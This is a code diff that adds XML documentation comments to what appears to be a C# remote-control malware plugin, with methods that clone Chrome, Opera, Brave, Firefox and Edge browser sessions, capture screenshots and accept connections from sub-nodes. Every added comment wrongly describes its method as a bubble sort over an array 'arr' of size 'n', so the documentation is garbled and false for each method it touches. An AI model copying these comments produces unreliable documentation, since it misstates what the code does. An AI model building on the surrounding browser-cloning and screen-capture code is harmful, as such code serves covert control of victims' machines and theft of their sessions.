@@ -38,10 +38,19 @@ namespace Plugin
         input_handler InputHandler;
         Process_Handler ProcessHandler;
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("SHCore.dll", SetLastError = true)]
         public static extern int SetProcessDpiAwareness(int awareness);
 
-
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task Run(Node node)
         {
             await node.SendAsync(new byte[] { 3 });//indicate that it has connected
@@ -195,6 +204,11 @@ namespace Plugin
 
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task<int> GetProcessViaCommandLine(string processName, string searchString) {
             return await Task.Run(() =>
             {
@@ -214,7 +228,11 @@ namespace Plugin
             });
         }
 
-
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task HandleCloneChrome()
         {
             if (!cloning_chrome)
@@ -239,6 +257,12 @@ namespace Plugin
                 cloning_chrome = false;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task HandleCloneOpera()
         {
             if (!cloning_opera)
@@ -263,6 +287,12 @@ namespace Plugin
                 cloning_opera = false;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task HandleCloneOperaGX()
         {
             if (!cloning_operagx)
@@ -287,6 +317,12 @@ namespace Plugin
                 cloning_operagx = false;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task HandleCloneBrave()
         {
             if (!cloning_brave)
@@ -311,6 +347,12 @@ namespace Plugin
                 cloning_brave = false;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task HandleCloneFirefox()
         {
             if (!cloning_firefox)
@@ -335,6 +377,12 @@ namespace Plugin
                 cloning_firefox = false;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task HandleCloneEdge()
         {
             if (!cloning_edge)
@@ -359,6 +407,12 @@ namespace Plugin
                 cloning_edge = false;
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task ScreenShotThread()
         {
             try
@@ -394,6 +448,12 @@ namespace Plugin
             }
             catch { }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
         {
             ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
@@ -408,6 +468,12 @@ namespace Plugin
 
             return null;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task<bool> AcceptSubSubNode(Node node)
         {
             byte[] id = await node.ReceiveAsync();
